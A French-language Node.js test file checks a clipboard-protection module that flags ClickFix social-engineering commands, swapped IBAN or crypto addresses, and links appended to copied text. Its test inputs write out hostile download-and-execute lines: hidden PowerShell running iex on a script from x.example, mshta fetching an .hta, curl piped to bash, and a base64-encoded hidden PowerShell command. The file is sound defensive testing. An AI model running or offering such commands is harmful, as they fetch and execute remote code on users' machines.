// Commandes piégées (ClickFix) et adresses remplacées : détection de src/shared/clipboard.js.
const { test } = require("node:test");
const assert = require("node:assert/strict");
const fs = require("node:fs");
const path = require("node:path");
const vm = require("node:vm");

const ctx = vm.createContext({});
vm.runInContext(fs.readFileSync(path.join(__dirname, "../../src/shared/clipboard.js"), "utf8"), ctx);
const { risk, hijack } = ctx.__fshClipboard;

const CLICKFIX = "Pour vérifier que vous êtes humain, appuyez sur Win+R, collez avec Ctrl+V puis appuyez sur Entrée.";
const DOCS = "Pour installer l'outil, copie la commande puis colle-la dans ton terminal (Ctrl+V) et appuie sur Entrée.";

test("commande PowerShell dangereuse sur une page ClickFix : bloquée", () => {
  assert.equal(risk("powershell -w hidden -c iex (iwr http://x.example/a.ps1)", CLICKFIX), "clickfix");
  assert.equal(risk("mshta https://x.example/captcha.hta", CLICKFIX), "clickfix");
  assert.equal(risk("cmd /c start /min powershell -c iwr x.example", CLICKFIX), "clickfix");
  assert.equal(risk("curl -s https://x.example/v | bash", "Vérification : je ne suis pas un robot. Collez puis Entrée."), "clickfix");
});

test("PowerShell caché et encodé : bloqué sur n'importe quelle page", () => {
  const enc = "powershell -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA";
  assert.equal(risk(enc, "page sans rapport"), "obfuscated");
  assert.equal(risk(enc, ""), "obfuscated");
});

test("la même commande dans une documentation (collez, Entrée) n'est pas bloquée", () => {
  for (const cmd of [
    "curl -fsSL https://exemple.fr/install.sh | sh",
    'powershell -c "iwr https://exemple.fr/i.ps1 | iex"',
    "/bin/bash -c \"$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)\"",
  ]) {
    assert.equal(risk(cmd, DOCS), null, cmd);
  }
});

test("une consigne banale seule ne suffit pas, il en faut une propre à ClickFix", () => {
  assert.equal(risk("curl https://x.example | sh", "Collez la commande puis appuyez sur Entrée."), null);
  assert.equal(risk("curl https://x.example | sh", "Appuyez sur Win+R."), null, "une seule consigne ne suffit pas");
});

test("du texte ordinaire ou trop court n'est jamais bloqué", () => {
  for (const t of ["bonjour", "https://exemple.fr/page", "npm install", "git clone https://github.com/x/y", "", null, 42]) {
    assert.equal(risk(t, CLICKFIX), null, String(t));
  }
});

test("adresse remplacée : une adresse sélectionnée devenue autre chose est détectée", () => {
  const iban = "FR76 3000 6000 0112 3456 7890 189";
  assert.ok(hijack(iban, "FR7600000000000000000000000"));
  assert.ok(hijack("bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh", "bc1qar0srrr7xfkvy5l643lydnw9re59gtzzwf5mdq"));
  assert.ok(hijack("0x52908400098527886E0F7030069857D2E4169EE7", "texte quelconque"));
});

test("adresse recopiée à l'identique, ou texte ordinaire : pas d'alerte", () => {
  const iban = "FR76 3000 6000 0112 3456 7890 189";
  assert.ok(!hijack(iban, "FR7630006000011234567890189"), "même IBAN sans espaces");
  assert.ok(!hijack(iban, iban));
  assert.ok(!hijack("un texte quelconque que je copie", "autre chose"), "ce qui est copié n'est pas une adresse");
  assert.ok(!hijack("", "FR7600000000000000000000000"), "rien de sélectionné");
});

test("lien ajouté à un texte copié : détecté", () => {
  const { appended } = ctx.__fshClipboard;
  assert.ok(appended("Une phrase que j'ai copiée.", "Une phrase que j'ai copiée.\n\nLire la suite sur https://journal.example/a?utm_source=copie"));
  assert.ok(appended("texte", "texte — source : http://exemple.fr/article/12"));
});

test("texte copié identique, remplacé ou prolongé sans lien : pas de nettoyage", () => {
  const { appended } = ctx.__fshClipboard;
  assert.ok(!appended("texte copié", "texte copié"));
  assert.ok(!appended("texte copié", "autre chose https://exemple.fr/long-lien"), "ne commence pas par la sélection");
  assert.ok(!appended("texte copié", "texte copié, suivi d'une longue suite sans aucune adresse"));
  assert.ok(!appended("ab", "ab https://exemple.fr/x"), "sélection trop courte");
  assert.ok(!appended("texte copié", "texte copié http://a.b"), "ajout trop court pour être un lien");
});
